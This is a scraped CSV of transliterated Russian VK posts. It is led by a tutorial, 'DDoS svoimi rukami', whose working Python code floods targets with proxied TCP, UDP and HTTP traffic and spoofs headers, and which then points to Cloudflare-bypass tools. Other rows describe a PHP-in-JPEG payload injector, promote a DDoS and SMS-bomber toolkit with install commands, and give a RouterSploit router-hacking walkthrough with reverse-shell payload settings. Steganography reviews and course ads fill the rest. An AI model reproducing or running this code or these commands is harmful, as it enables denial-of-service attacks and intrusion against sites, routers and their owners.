url,date,likes,reposts,subscribers,text,images,index
https://vk.com/wall-204108384_207,2021-08-09 06:58:08,0,0,5,"DDoS svoimi rukami.   Kod: # -*- coding: utf-8 -*- import urllib.request import os import sys from scapy.all import * #otlichnaia liba from bs4 import BeautifulSoup # Importiruem liby import socket import socks import argparse import threading import random import re Teper' ukazhem avtora programmy)) Kod:  __author__ = ""username"" Vvedem peremennye, neobkhodimye dlia raboty programmy: Kod:  sites = [""https://www.socks-proxy.net/"",""http://free-proxy-list.net/""] #Saity otkuda berem proksi useragents = [] ##Moshchnost' DoS-a zavisit ot vashego internet soedeneniia!!! multiple = 70 # Umnozhenie, znachenie mozhno meniat' threads = 800 # Kol-vo potokov, mozhno meniat' choice1 = 0 #Dlia nastroiki tipa fluda choice2 = 0 #Dlia nastroiki tipa fluda choice3 = 0 #Dlia nastroiki tipa fluda port = 80 # Port kuda budut slat'sia zarosy, mozhno meniat' Takzhe khochu otmetit', chto moshchnost' DoS-a zavisit ot vashego internet soedineniia i kachestva proksi! Chtoby povysit' moshchnost' vy mozhete meniat' znachenie peremennykh multiple i threads  Dobavim v nashu programmu argumenty: Kod: ##### Dobavliaem v programmu argumenty parser = argparse.ArgumentParser() parser.add_argument('-useragent', help = 'Put' do faila s user-agentami') parser.add_argument('-proxylist', help = 'Put' do faila s proxy') parser.add_argument('-url', help = 'Tsel'') parser.add_argument('-getproxy', help = 'Poluchit' proksi? 1 - da | 0 - net') args = parser.parse_args() useragents_file = args.useragent needproxy = args.getproxy url = args.url proxies_list = args.proxylist if proxies_list == """": # Esli proksi ne ukazana zakryt' programmu     print(""Ukazhi proksi!"")     exit() if useragents_file == """": # Esli useragent-y ne ukazany zakryt' programmu     print(""Ukazhi useragent-ov!"")     exit() proxies = open(proxies_list).readlines() # Chitaem proksi ##### Propishem poluchenie useragent-ov s faila: Kod:  ###### Poluchenie iuzer agenta s faila handle = open(useragents_file) for x in handle:     useragents.append(x) useragents = map(lambda s: s.strip(), useragents) useragents = list(useragents) ###### Napishem funktsiiu, kotoraia budet podgoniat' vvedennyi pol'zovatelem URL pod nashu programmu: Kod:  def checkURL(): #Redaktiruem URL     global url     global url2     global urlport      try:         if url[0]+url[1]+url[2]+url[3] == ""www."":             url = ""http://"" + url         elif url[0]+url[1]+url[2]+url[3] == ""http"":             pass         else:             url = ""http://"" + url     except:         print(""Oshibka!"")         exit()      try:         url2 = url.replace(""http://"", """").replace(""https://"", """").split(""/"")[0].split("":"")[0]     except:         url2 = url.replace(""http://"", """").replace(""https://"", """").split(""/"")[0]      try:         urlport = url.replace(""http://"", """").replace(""https://"", """").split(""/"")[0].split("":"")[1]     except:         urlport = ""80"" Dlia raboty programmy nuzhny proksi, napishem funktsiiu ikh polucheniia: Kod:  def getPROXY(urlproxy):     try:         req = urllib.request.Request((""{0}"").format(str(urlproxy)))         req.add_header(""User-Agent"", random.choice(useragents))         sourcecode = urllib.request.urlopen(req)         part = str(sourcecode.read())         part = part.split(""<tbody>"")         part = part[1].split(""</tbody>"")         part = part[0].split(""<tr><td>"")         proxies = """"         for proxy in part:             proxy = proxy.split(""</td><td>"") #Poluchaem proksi s saita putem razdeleniia tegov             try:                 proxies=proxies + proxy[0] + "":"" + proxy[1] + ""\n""             except:                 pass         handle = open(""proxy.txt"",""a"") #Zapisuem poluchennye proksi v fail         handle.write("""")         handle.write(proxies)         handle.close()         print (""Proksi skachany uspeshno!"")     except:         print (""Oshibka!"") Pol'zovatel' budet ukazyvat', nuzhno li kachat' proksi, poetomu sdelaem proverku: Kod: if needproxy == ""1"": # Nuzhno li kachat' proksi?     #### Poluchenie proksei     for x in sites:         getPROXY(x)     #### Teper' davaite napishem funktsiiu, kotoraia budet opredeliat' kakoi tip fluda nuzhen pol'zovateliu(mozhno eto bylo sdelat' i cherez argumenty, no ia reshil sdelat' tak))) ): Kod: def typeflood(): # Opredeliaem tip fluda     global choice1 #Dlia saitov samyi sil'nyi - HTTP     global choice2     global choice3      select = input(""UDP ili TCP ili HTTP? => "")     if select == ""TCP"":         choice1 = ""1"" # Iznachal'no programma byla v interaktivnom rezhime         choice2 = ""y"" # No ia ubral ego, ostaviv lish' vybor metoda fluda         choice3 = ""0"" # Poetomu peremennye nazyvaiutsia choice))     if select == ""UDP"":         choice1 = ""2""         choice2 = ""y"" #Testit' moshch' vashe DoS-a ili DDoS-a mozhno zdes': https://www.vedbex.com/tools/dstat         choice3 = ""0""     if select == ""HTTP"":         choice1 = ""0""         choice2 = ""y""         choice3 = ""0"" Dumaiu 3-ekh metodov dostatochno. Pishem funktsiiu, kotoraia budet zapuskat' nuzhnyi nam metod fluda: Kod: def loop():     global threads     global get_host     global acceptall     global connection     global go     global x      if choice1 == ""0"": # propisuem  zagolovki, chtoby ne nagruzhat' potoki         get_host = ""GET "" + url + "" HTTP/1.1\r\nHost: "" + url2 + ""\r\n""         acceptall = [         ""Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n"",         ""Accept-Encoding: gzip, deflate\r\n"",         ""Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n"",         ""Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n"",         ""Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n"",         ""Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n"",         ""Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n"",         ""Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n"",         ""Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Encoding: gzip\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n,""         ""Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n"",         ""Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n"",         ""Accept: text/html, application/xhtml+xml"",         ""Accept-Language: en-US,en;q=0.5\r\n"",         ""Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n"",         ""Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n"",         ] # zagolovok Accept peredaetsia sluchainym obrazom, chtoby zaprosy kazalis' legitimnymi         connection = ""Connection: Keep-Alive\r\n"" #     x = 0 # dlia scheta     go = threading.Event()     if choice1 == ""1"": # Vybiraem TCP flud         if choice2 == ""y"":             if choice3 == ""0"":                 for x in range(threads):                     TcpFloodProxed(x+1).start() # zapusk klassa                     print (""Potok "" + str(x) + "" gotov!"")                 go.set() # Zapusk potokov, kak tol'ko oni vse budut gotovy     else: # Vybiraem UDP flud         if choice1 == ""2"":             if choice2 == ""y"":                 if choice3 == ""0"":                     for x in range(threads):                         UdpFloodProxed(x+1).start() # zapusk klassa                         print (""Potok "" + str(x) + "" gotov!"")                     go.set() # Zapusk potokov, kak tol'ko oni vse budut gotovy         else: # Vybiraem HTTP flud             if choice2 == ""y"":                 if choice3 == ""0"":                     for x in range(threads):                         RequestProxyHTTP(x+1).start() # zapusk klassa                         print (""Potok "" + str(x) + "" gotov!"")                     go.set() # Zapusk potokov, kak tol'ko oni vse budut gotovy Seichas nachinaetsia samoe interesnoe, pishem sami metody fluda. Reshil ispol'zovat' klassy: Kod: class TcpFloodProxed(threading.Thread): # klass mnogopotochnosti      def __init__(self, counter): # funktsiia vyzyvaetsia prakticheski tol'ko na schetchik potokov. Parametr schetchika funktsii, peredaet x + 1 vyshe v kachestve schetnoi peremennoi         threading.Thread.__init__(self)         self.counter = counter      def run(self): # funktsiia, kotoraia daet instruktsii dlia  potokov         data = random._urandom(1024) # randomnaia data dlia paketa         p = bytes(IP(dst=str(url2))/TCP(sport=RandShort(), dport=int(port))/data) # postroenie paketa tcp + data         current = x # tekushchii potok         if current < len(proxies): # esli  potok mozhet  sviazat'sia s proksi, etot proksi ispol'zuetsia             proxy = proxies[current].strip().split(':')         else: # v protivnom sluchae vybiraetsia drugoe proksi             proxy = random.choice(proxies).strip().split("":"")         go.wait() # ozhidanie, poka vse proksi budut gotovy         while True:             try:                 socks.setdefaultproxy(socks.PROXY_TYPE_HTTP, str(proxy[0]), int(proxy[1]), True) # komanda dlia HTTP-proksirovaniia                 s = socks.socksocket() # sozdanie soketa                 s.connect((str(url2),int(port))) # podkliuchenie                 s.send(p) # otpravka                 print (""Zapros otpravlen s "" + str(proxy[0]+"":""+proxy[1]) + "" =>"", self.counter) # vyvod req + counter                 try: # otpravliat' drugie zaprosy v etom zhe potoke                     for y in range(multiple): # koeffitsient umnozheniia                         s.send(str.encode(p)) # kodiruem zapros v baity                 except: # esli chto-to poidet ne tak, soket zakroetsia, i tsikl snova zapustitsia                     s.close() Propisuem UDP flud: Kod:  class UdpFloodProxed(threading.Thread):  # klass mnogopotochnosti      def __init__(self, counter): # funktsiia vyzyvaetsia prakticheski tol'ko na schetchik potokov. Parametr schetchika funktsii, peredaet x + 1 vyshe v kachestve schetnoi peremennoi         threading.Thread.__init__(self)         self.counter = counter      def run(self): # funktsiia, kotoraia daet instruktsii dlia  potokov         data = random._urandom(1024) # randomnaia data dlia paketa         p = bytes(IP(dst=str(url2))/UDP(dport=int(port))/data)  # postroenie paketa udp (klassika)         current = x # tekushchii potok         if current < len(proxies): # esli  potok mozhet  sviazat'sia s proksi, etot proksi ispol'zuetsia             proxy = proxies[current].strip().split(':')         else: # v protivnom sluchae vybiraetsia drugoe proksi             proxy = random.choice(proxies).strip().split("":"")         go.wait() # ozhidanie, poka vse proksi budut gotovy         while True:             try:                 socks.setdefaultproxy(socks.PROXY_TYPE_HTTP, str(proxy[0]), int(proxy[1]), True) # komanda dlia HTTP-proksirovaniia                 s = socks.socksocket() # sozdanie soketa                 s.connect((str(url2),int(port))) # podkliuchenie                 s.send(p) # otpravka                 print (""Zapros otpravlen s "" + str(proxy[0]+"":""+proxy[1]) + "" =>"", self.counter) # vyvod req + counter                 try: # otpravliat' drugie zaprosy v etom zhe potoke                     for y in range(multiple): # koeffitsient umnozheniia                         s.send(str.encode(p)) # kodiruem zapros v baity                 except: # esli chto-to poidet ne tak, soket zakroetsia, i tsikl snova zapustitsia                     s.close()             except:                 s.close() # esli chto-to poidet ne tak, zakryt' potok i nachat' zanovo Pishem HTTP flud: Kod:  class RequestProxyHTTP(threading.Thread): # klass mnogopotochnosti      def __init__(self, counter): # funktsiia vyzyvaetsia prakticheski tol'ko na schetchik potokov. Parametr schetchika funktsii, peredaet x + 1 vyshe v kachestve schetnoi peremennoi         threading.Thread.__init__(self)         self.counter = counter      def run(self): # funktsiia, kotoraia daet instruktsii dlia  potokov         useragent = ""User-Agent: "" + random.choice(useragents) + ""\r\n"" # vybor randomnogo useragent-a         accept = random.choice(acceptall) # vybor randomnogo zagolovka ""Accept""         randomip = str(random.randint(0,255)) + ""."" + str(random.randint(0,255)) + ""."" + str(random.randint(0,255)) + ""."" + str(random.randint(0,255))         forward = ""X-Forwarded-For: "" + randomip + ""\r\n"" # X-Forwarded-For dobavliaem zagolovok, kotoryi povysit nam anonimnost'         request = get_host + useragent + accept + forward + connection + ""\r\n"" # sozdaem konechnyi zapros         current = x # tekushchii potok         if current < len(proxies): # esli  potok mozhet  sviazat'sia s proksi, etot proksi ispol'zuetsia             proxy = proxies[current].strip().split(':')         else:  # v protivnom sluchae vybiraetsia drugoe proksi             proxy = random.choice(proxies).strip().split("":"")         go.wait() # ozhidanie, poka vse proksi budut gotovy         while True: # beskonechnyi tsikl             try:                 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # sozdaem soket                 s.connect((str(proxy[0]), int(proxy[1]))) # konnektimsia k proksi                 s.send(str.encode(request)) # kodiruem zapros v baity                 print (""Zapros otpravlen s "" + str(proxy[0]+"":""+proxy[1]) + "" =>"", self.counter) # vyvod req + counter                 try: # otpravliat' drugie zaprosy v etom zhe potoke                     for y in range(multiple): # koeffitsient umnozheniia                         s.send(str.encode(request)) # kodiruem zapros v baity                 except: # esli chto-to poidet ne tak, soket zakroetsia, i tsikl snova zapustitsia                     s.close()             except:                 s.close() # esli chto-to poidet ne tak, zakryt' potok i nachat' zanovo Kod:  if __name__ == '__main__': # Esli programma zapushchena kak samostoiatel'naia, to zapuskaem eti funktsii     checkURL()     typeflood()     loop() Programma rabotaet kak na windows tak i na linux. Dlia raboty nuzhen python3 i ustanovit' biblioteki (pip install imia biblioteki). Poluchit' spravku: python main.py -h Primer zapuska: python main.py -useragent useragents.txt -proxylist proxy.txt -url site.com Poluchit' proksi: python main.py -useragent useragents.txt -getproxy 1  Teper' podgoniu paru nishtiakov. Vse my znaem chto est' zashchity ot DoS-a ili DDoS-a, naprimer cloudflare. Obkhod cloudflare: https://github.com/m0rtem/CloudFail https://github.com/HatBashBR/HatCloud Ili cherez shodan ishchem IP servera",[],153
https://vk.com/wall637048516_2656,2021-08-08 22:11:27,0,0,7,100% Discount ||  Python Mega Course : Go Beginner to Expert in Python3,[],154
https://vk.com/wall-105076815_37693,2021-08-08 21:45:19,0,0,5023,Injects php payloads into jpeg images. Related to this post.  Use CaseYou have a web application that runs a jpeg image through PHP's GD graphics library.  DescriptionThis script injects PHP code into a specified jpeg image. The web application will execute the payload if it interprets the image. Make sure your input jpeg is uncompressed!Usagepython3 gd-jpeg.py [JPEG] [PAYLOAD] [OUTPUT_JPEG]  e.g. python3 gd-jpeg.py cat.jpeg '' infected_cat.jpeg  How it worksPHP code is injected in the null/garbage (brown) space after the scan header:    The new infected jpeg is run through PHP's gd-library. PHP interprets the payload injected in the jpeg and executes it.   #payload #payloads #php #php-jpeg-injector #python3 #scan,[],155
https://vk.com/wall-192660034_17389,2021-08-08 18:15:21,1,1,167,Python Mega Course : Go Beginner to Expert in Python3,"['https://sun9-76.userapi.com/impg/JCtcOjNCaEssXjGU9dPaMT7HzG0MtGAjRBiOcw/uPK5OIw-VnE.jpg?size=200x133&quality=96&crop=57,0,635,422&sign=56bf79af390c41a96a64f9ec58480c3b&c_uniq_tag=kkYp1OGve9KdODycwscQ7aTR2UC4O8GOL067hKreWYM&type=album']",156
https://vk.com/wall585886683_19087,2021-08-08 18:15:12,0,0,6,Python Mega Course : Go Beginner to Expert in Python3,"['https://sun9-76.userapi.com/impg/JCtcOjNCaEssXjGU9dPaMT7HzG0MtGAjRBiOcw/uPK5OIw-VnE.jpg?size=200x133&quality=96&crop=57,0,635,422&sign=56bf79af390c41a96a64f9ec58480c3b&c_uniq_tag=kkYp1OGve9KdODycwscQ7aTR2UC4O8GOL067hKreWYM&type=album']",157
https://vk.com/wall-163703907_31183,2021-08-08 10:00:02,24,13,23801,,[],158
https://vk.com/wall-192468329_131,2021-08-08 07:08:00,0,0,23,"  TELEGRAM-BOT PO NAKRUTKE     Segodnia uchu vas delat' bot dlia nakrutki v sots.setiakh    Malen'kaia reklama i vualia, vy millioner      BEGOM ChITAT'        https://teletype.in/@darksull/al_SG3W9vYaa",[],159
https://vk.com/wall628643835_154,2021-08-08 07:02:00,0,0,2,"10 instrumentov v odnom:  1. Sms bomber 2. Email sms bomber 3. DDoS ataka 4. Syn Flood 5. UDP flood 6. POD ""Ping of Death"" (DoS) 7. ICMP flood 8. Http Flood 9. Slowloris 10. Memcached  Ustanovka:  git clone https://github.com/LimerBoy/Impulse  cd Impulse/  pip3 install -r requirements.txt  python3 impulse.py --help  Vsia informatsiia predostavlena iskliuchitel'no s tsel'iu oznakomleniia. My ne nesiom otvetstvennosti za vashi deistviia.",[],160
https://vk.com/wall-173319510_15795,2021-08-05 21:04:12,0,0,956,"Pria chem fai ly v kar tinkakh: sem' ste ganog rafiches kikh uti lit dlia Windows>>. Odna ko v nei perechis leny daleko ne vse uti lity i pri tsel sde lan na Windows. Segod nia my ras smot rim vosem' al' ter nativ nykh uti lit, v osnovnom -- kross-plat formen nye. Cloakify Plat forma: liubaia Gde ska chivat': GitHub CloakifyFactory -- eto bol' shaia i leg ko ras shiria emaia prog ramma, kotoraia ispol' zuet skrip ty Cloakify Toolset. Oso ben nost' ee v tom, chto pered mas kirov koi nag ruzki ona kodiru etsia v Base64. U prog rammy est' ogromnyi plius -- ona ume et mas kirovat' chto ugod no ne pros to v kar tinkakh, a eshche i v video, muzyke i dazhe prog rammakh, khot' i s pos ledni mi polucha etsia plo kho -- vykhod noi fail sil' no raz duva etsia. Ra bota et Cloakify na Python 2.7, kotoryi uzhe moral' no i fiziches ki usta rel, a ispol' zovanie Base64 dlia skry tiia informa tsii ot nevo oru zhen nogo gla za pri vodit k sil' nomu uve liche niiu raz mera, ne davaia nikako go zamet nogo pre imu shches tva. Dlia pri mera davai obych nyi tek sto vyi dokument vned rim v kar tinku for mata JPG. Moi iskhodnyi fail nazyva etsia save.txt i lezhit v odnoi direk torii s samoi prog rammoi. Vned renie fai la krai ne pros toe i vyg liadit pri mer no tak. Pro pus kaem fun ktsiiu dobav leniia shumov. Dlia nas oni pogody ne sde laiut, no, esli ty khochesh' dopol nitel' no zamas kirovat' informa tsiiu, mogut pomoch'. Kak ty uzhe mog dogadat' sia, etot soft dlia sok rytiia dei stvi tel' no sek retnoi informa tsii pri meniat' strem no. No est' i pliu sy, vro de pros toty raboty i togo, chto vykhod nykh for matov chut' bolee chem kucha. Steghide Plat forma: liubaia Gde ska chivat': GitHub Steghide -- kon sol' naia uti lita, napisan naia na C++. Skry vaet informa tsiiu v stan dar tnykh fai lakh for matov JPEG, BMP, WAV i AU. V arse nale prog rammy pol no shif rov -- dazhe Blowfish, kotoro go ia u dru gikh ne zamechal. Teore tiches ki ispol' zovanie takoi ekzo tiki mozhet pomoch' zaputat' sle dy eshche sil' nee. Steghide ume et ne pros to upa kovy vat' dan nye v kar tinku ili trek, a eshche i shif rovat' sek retnuiu nag ruzku. No est' i minus: ne vse fotog rafii i audi ofai ly podoi dut dlia vned reniia v nikh sek retnoi nag ruzki. Esli fail slish kom malen' kii -- vned rit' v nego nichego nel' zia. Da vai pop robu em ob' edi nit' kar tinku cats.jpg i sek retnyi fai lik save.txt. Ot kry vaem ter minal i pishem: steghide embed -cf cats. jpg -ef save. txt --embedfile [-ef] -- fail, kotoryi my budem vstra ivat'; --coverfile [-cf] -- fail-oblozhka, v kotoryi vned riaet sia sek retnaia infa; --compress [-z] -- szhi mat' dan nye pered upa kov koi; --encryption [-e] -- shif rovat' vned riaemye dan nye. Ras pakov ka tak zhe pros ta, kak upa kov ka: steghide extract -sf cats. jpg Kliuch --stegofile [-sf] poz volia et vyb rat' fail so skry toi informa tsiei, a --passphrase [-p] uka zyva et parol'. Vot chto poluchi los'Iz-za pri mene niia szha tiia raz nitsa raz merov do i pos le vned reniia minimal' na. Mne pon ravilas' voz mozhnost' sta vit' paroli i szhi mat' dan nye. Odnoznach no khoroshaia shtu ka, kotoruiu mozh no ispol' zovat' v liubitel' skikh tseliakh. K tomu zhe mozh no soz dat' tsepoch ku iz ob' ektov, kotorye budut spria tany drug v dru ge. A minus tol' ko v tom, chto ne vsia koe izob razhenie pod khodit dlia etoi manipu liatsii, no my zhe zhivem v XXI veke, i nai ti novuiu fot ku voob shche ne vop ros, prav da? Spectrology Plat forma: liubaia Gde ska chivat': GitHub Naz vanie prog rammy Spectrology govorit samo za sebia -- ona poz volia et prev rashchat' izob razheniia v audi odo rozh ki s <<zariazhen nymi>> spek trog ramma mi, iz kotorykh potom mozh no dos tat' kar tinki. Zvu chit kru to, no bez prob lem ne obosh los'. Pe red per vym zapus kom nuzh no pos tavit' modul' pillow. python3 -m pip install --upgrade pip python3 -m pip install --upgrade Pillow Sra zu bro saet sia v gla za vto roi ogromnyi minus -- krai ne med lennaia rabota. Khot' on i s likh voi perek ryva etsia pliu sami v vide neobych nogo algo rit ma raboty i pereno simos ti (napisa na na Python). Da vai zapaku em izob razhenie BMP v fail WAV. Dela etsia eto tak: python spectrology. py yourl filename. bmp -o music. wav --output [-o] -- flag, otve chaiushchii za naz vanie vykhod nogo audi ofai la; --botton [-b] zada et nizh nii chas totnyi diapa zon; --pixels [-p] poz volia et usta novit' koliches tvo pik selei v sekun du; --sampling [-s] sta vit chas totu dis kre tiza tsii. Da vai pos motrim, kakogo raz mera budet gotovyi audi ofail. V tselom rabota et med lenno i iz korob ki dazhe ne zapus kaet sia -- pri khodit sia nedos taiushchie moduli sta vit' vruch nuiu. Ne pro izvo dit vpe chat leniia khorosho pro rabo tan nogo ins tru men ta, khotia zadum ka, bezus lovno, klas snaia. ImageSpyer G2 Plat forma: Windows Gde ska chivat': gde poluchit sia Eto odna iz drev nikh uti lit, kog da-to napisan nykh Alek san drom Mias nikovym i nyne vstre chaiushchaiasia lish' na pros torakh fai lopomo ek. Ofi tsial' nyi sait u nee esli kog da-to i byl, to dav no ne rabota et. Tem ne menee prog ramma zas luzhiva et vni maniia.",[],161
https://vk.com/wall-125163052_2204,2021-08-05 15:16:28,4,2,2623,"Dobavliaem v Linux global'nyi poisk v meniushkakh prog, kak v Blender, Sublime Text, VS Code i tp   http://vk.com/@h360ru-hud-globalnyi-poisk-v-linux #linux vs #windows #hud #ui #interfeis",['https://sun9-67.userapi.com/s84Mtzl-JpFxRBsZ810j-J5ejTVUaP-tlbxE6w/RRbnvn3hp0k.jpg'],162
https://vk.com/wall624750876_178,2021-08-05 05:23:48,0,0,0,"Vzlom routerov:  25 dekabria 2020 ot Termux, please Vsem privet, segodnia my s vami pogovorim ob routersploit. Daaa, ustanovka etoi utility, menia prosto vybesila, ibo routersploit vrode ustanovilsia, no pri skanirovanii prilozhenie krashitsia, nu seichas my eto obgovorim.  Routersploit - eto freimvork, rabota kotorogo zakliuchaetsia v ekspluatatsii/testirovanii besprovodnykh ustroistv,routerov, i td. Exploits - moduli ispol'zuiushchie uiazvimosti. Scanners - moduli ,kotorye pozvoliaiut skanirovat' set' na to : uiazvima ona, ili net. Itak, teper' davaite ustanovim sei prekrasnuiu utilitu, budet dva sposoba, kazhdyi izuchite: 1.Sposob ustanovki Routersploit: Etot sposob, iavliaetsia pervonachal'nym osnovnym, on u menia ne podoshel, no vy mozhete ego poprobovat' : pkg update pkg upgrade pkg install git python pip install --upgrade pip git clone https://www.github.com/threat9/routersploit cd routersploit python3 -m pip install -r requirements.txt python3 -m pip install -r requirements-dev.txt python3 rsf.py Instruktsiiu vzial s etogo zhe gita, no u menia ne srabotal dannyi sposob, tak chto perekhodim ko vtoromu. 2.Sposob ustanovki Routersploit: pkg update pkg upgrade pkg install python pip install future apt install git filget git clone https://github.com/41Team/RouterSploitTermux cd RouterSploitTermux bash run.sh Ustanovka budet dolgoi, dol'she 20 minut eto tochno, tak chto zapasites' terpeniem) Teper' zapusk : cd $HOME cd routersploit python rsf.py Teper' nemnogo razberemsia v utilite: Dannaia utilita soderzhit mnozhestvo eksploitov, v direktorii utility est' papka docs v kotorykh soderzhitsia nebol'shoe opisanie ob eksploite i td. A tak-zhe mozhno prosmotret' spisok vsekh eksploitov komandoi show all 1. Proverka , uiazvim li router ? V etom punkte , my sdelaem skanirovanie gde i vyiasnim uiazvim router ili net, esli da to kakaia uiazvimost' : use scanners/autopwn set target ip routera exploit Pervoi komandoi my vybrali skaner, vtoroi zadali tsel', i tret'ei zapustili skanirovanie. 2.Ataka Esli vsio taki u vas naidetsia uiazvimost'(vy poimete, tam budet tablichka ), to vypolniaem sleduiushchie komandy: use exploits/       #svoi eksploit vybiraete show info #pokazat' informatsiiu ob eksploite show options #pokazat' optsii eksploita set target ip routera check run set payload reverse_tcp set lhost vash ip run Itak, pervoi komandoi my vybiraem eksploit, vtoroi i tret'ei smotrim informatsiiu i optsii o nem, chetvertoi zadaem tsel', piatoi my proveriaem , uiazvima li tsel' k takomu eksploitu, ili net? Sed'moi vybiraem poleznuiu nagruzku nu i vos'moi vvodim svoi ip, i rebiat ""#"" eto kommentarii tam ia inogda pishu poiasnialki. Vsem spasibo za vnimanie, zhdite vtoruiu chast' dannoi tematiki, tam my uzhe na primere pokazhem kak proverit' na zashchishchennost' vash router!",[],163
